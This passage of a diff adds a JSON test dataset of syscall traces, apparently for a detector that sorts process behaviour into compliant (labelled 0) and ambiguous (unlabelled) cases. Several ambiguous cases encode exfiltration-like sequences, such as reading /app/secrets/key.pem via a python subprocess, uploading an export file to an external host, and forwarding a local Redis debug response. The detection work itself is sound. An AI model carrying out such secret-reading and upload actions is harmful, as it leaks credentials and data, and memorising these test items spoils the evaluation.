+        "resource": "/usr/bin/curl",
+        "params": "health-check"
+      },
+      {
+        "syscall": "read",
+        "resource": "/app/logs/app.log",
+        "params": "4096"
+      },
+      {
+        "syscall": "write",
+        "resource": "/app/output/report.csv",
+        "params": "1024"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:443",
+        "params": "HTTPS"
+      },
+      {
+        "syscall": "write",
+        "resource": "/app/output/report.csv",
+        "params": "1024"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-014",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.5:443",
+        "params": "heartbeat"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-015",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/app/data/config.json",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.10:8080",
+        "params": "API"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/data/config.json",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/data/config.json",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.5:443",
+        "params": "heartbeat"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-016",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/var/data/db.sqlite",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/var/data/db.sqlite",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "read",
+        "resource": "/app/logs/app.log",
+        "params": "4096"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/data/config.json",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-017",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/tmp/cache/session.dat",
+        "params": "O_RDWR"
+      },
+      {
+        "syscall": "read",
+        "resource": "/app/logs/app.log",
+        "params": "4096"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/tmp/cache/session.dat",
+        "params": "O_RDWR"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.5:443",
+        "params": "heartbeat"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/tmp/cache/session.dat",
+        "params": "O_RDWR"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-018",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "script.py"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/tmp/cache/session.dat",
+        "params": "O_RDWR"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-019",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "write",
+        "resource": "/app/output/report.csv",
+        "params": "1024"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.5:443",
+        "params": "heartbeat"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.5:443",
+        "params": "heartbeat"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/data/config.json",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.5:443",
+        "params": "heartbeat"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-020",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "script.py"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-021",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.5:443",
+        "params": "heartbeat"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/var/data/db.sqlite",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.10:8080",
+        "params": "API"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:443",
+        "params": "HTTPS"
+      },
+      {
+        "syscall": "write",
+        "resource": "/app/output/report.csv",
+        "params": "1024"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-022",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "write",
+        "resource": "/app/output/report.csv",
+        "params": "1024"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:443",
+        "params": "HTTPS"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "script.py"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-023",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:443",
+        "params": "HTTPS"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "health-check"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-024",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/tmp/cache/session.dat",
+        "params": "O_RDWR"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/data/config.json",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "health-check"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-025",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.5:443",
+        "params": "heartbeat"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/tmp/cache/session.dat",
+        "params": "O_RDWR"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/tmp/cache/session.dat",
+        "params": "O_RDWR"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/var/data/db.sqlite",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "write",
+        "resource": "/app/output/report.csv",
+        "params": "1024"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-026",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:443",
+        "params": "HTTPS"
+      },
+      {
+        "syscall": "read",
+        "resource": "/app/logs/app.log",
+        "params": "4096"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.10:8080",
+        "params": "API"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/tmp/cache/session.dat",
+        "params": "O_RDWR"
+      },
+      {
+        "syscall": "write",
+        "resource": "/app/output/report.csv",
+        "params": "1024"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-027",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:443",
+        "params": "HTTPS"
+      },
+      {
+        "syscall": "read",
+        "resource": "/app/logs/app.log",
+        "params": "4096"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "health-check"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-028",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:443",
+        "params": "HTTPS"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.5:443",
+        "params": "heartbeat"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/var/data/db.sqlite",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/data/config.json",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/var/data/db.sqlite",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-029",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/tmp/cache/session.dat",
+        "params": "O_RDWR"
+      },
+      {
+        "syscall": "read",
+        "resource": "/app/logs/app.log",
+        "params": "4096"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:443",
+        "params": "HTTPS"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-030",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/tmp/cache/session.dat",
+        "params": "O_RDWR"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-031",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "read",
+        "resource": "/app/logs/app.log",
+        "params": "4096"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:443",
+        "params": "HTTPS"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:443",
+        "params": "HTTPS"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.5:443",
+        "params": "heartbeat"
+      },
+      {
+        "syscall": "write",
+        "resource": "/app/output/report.csv",
+        "params": "1024"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-032",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "write",
+        "resource": "/app/output/report.csv",
+        "params": "1024"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:443",
+        "params": "HTTPS"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/var/data/db.sqlite",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-033",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:443",
+        "params": "HTTPS"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/data/config.json",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/tmp/cache/session.dat",
+        "params": "O_RDWR"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "script.py"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-034",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/app/data/config.json",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/data/config.json",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.10:8080",
+        "params": "API"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-035",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:443",
+        "params": "HTTPS"
+      },
+      {
+        "syscall": "read",
+        "resource": "/app/logs/app.log",
+        "params": "4096"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-036",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/var/data/db.sqlite",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "script.py"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/var/data/db.sqlite",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/data/config.json",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-037",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/tmp/cache/session.dat",
+        "params": "O_RDWR"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-038",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/var/data/db.sqlite",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/data/config.json",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-039",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.5:443",
+        "params": "heartbeat"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/var/data/db.sqlite",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "read",
+        "resource": "/app/logs/app.log",
+        "params": "4096"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-040",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "read",
+        "resource": "/app/logs/app.log",
+        "params": "4096"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/data/config.json",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:443",
+        "params": "HTTPS"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.10:8080",
+        "params": "API"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-041",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.10:8080",
+        "params": "API"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-042",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "write",
+        "resource": "/app/output/report.csv",
+        "params": "1024"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/tmp/cache/session.dat",
+        "params": "O_RDWR"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-043",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/var/data/db.sqlite",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "script.py"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.5:443",
+        "params": "heartbeat"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-044",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "write",
+        "resource": "/app/output/report.csv",
+        "params": "1024"
+      },
+      {
+        "syscall": "read",
+        "resource": "/app/logs/app.log",
+        "params": "4096"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-045",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "script.py"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/data/config.json",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-046",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.10:8080",
+        "params": "API"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "script.py"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-047",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:443",
+        "params": "HTTPS"
+      },
+      {
+        "syscall": "read",
+        "resource": "/app/logs/app.log",
+        "params": "4096"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-048",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "script.py"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-049",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "health-check"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-050",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "write",
+        "resource": "/app/output/report.csv",
+        "params": "1024"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "health-check"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-051",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:443",
+        "params": "HTTPS"
+      },
+      {
+        "syscall": "write",
+        "resource": "/app/output/report.csv",
+        "params": "1024"
+      },
+      {
+        "syscall": "write",
+        "resource": "/app/output/report.csv",
+        "params": "1024"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-052",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "write",
+        "resource": "/app/output/report.csv",
+        "params": "1024"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-053",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.10:8080",
+        "params": "API"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:443",
+        "params": "HTTPS"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/tmp/cache/session.dat",
+        "params": "O_RDWR"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:443",
+        "params": "HTTPS"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-054",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/var/data/db.sqlite",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "script.py"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/var/data/db.sqlite",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-055",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/app/data/config.json",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/tmp/cache/session.dat",
+        "params": "O_RDWR"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:443",
+        "params": "HTTPS"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-056",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.5:443",
+        "params": "heartbeat"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:443",
+        "params": "HTTPS"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-057",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/tmp/cache/session.dat",
+        "params": "O_RDWR"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-058",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "script.py"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.10:8080",
+        "params": "API"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.10:8080",
+        "params": "API"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "script.py"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.5:443",
+        "params": "heartbeat"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "DC-059",
+    "category": "deterministic_compliant",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/tmp/cache/session.dat",
+        "params": "O_RDWR"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "script.py"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.5:443",
+        "params": "heartbeat"
+      },
+      {
+        "syscall": "write",
+        "resource": "/app/output/report.csv",
+        "params": "1024"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:443",
+        "params": "HTTPS"
+      }
+    ],
+    "gold_label": 0
+  },
+  {
+    "case_id": "AM-000",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/tmp/export_data.csv",
+        "params": "O_WRONLY"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "external-api.com:443",
+        "params": "upload"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-001",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-002",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "-c 'import subprocess'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/secrets/key.pem",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-003",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/tmp/export_data.csv",
+        "params": "O_WRONLY"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "external-api.com:443",
+        "params": "upload"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-004",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-005",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-006",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-007",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-008",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-009",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-010",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-011",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/tmp/export_data.csv",
+        "params": "O_WRONLY"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "external-api.com:443",
+        "params": "upload"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-012",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "-c 'import subprocess'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/secrets/key.pem",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-013",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "-c 'import subprocess'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/secrets/key.pem",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-014",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/tmp/export_data.csv",
+        "params": "O_WRONLY"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "external-api.com:443",
+        "params": "upload"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-015",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-016",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "-c 'import subprocess'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/secrets/key.pem",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-017",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-018",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "-c 'import subprocess'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/secrets/key.pem",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-019",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-020",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/tmp/export_data.csv",
+        "params": "O_WRONLY"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "external-api.com:443",
+        "params": "upload"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-021",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-022",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
+        "params": "-c 'import subprocess'"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/app/secrets/key.pem",
+        "params": "O_RDONLY"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-023",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.200:9090",
+        "params": "api"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/curl",
+        "params": "localhost:6379/debug"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "10.0.0.200:9090",
+        "params": "resp"
+      }
+    ],
+    "gold_label": null
+  },
+  {
+    "case_id": "AM-024",
+    "category": "ambiguous",
+    "events": [
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/python3",
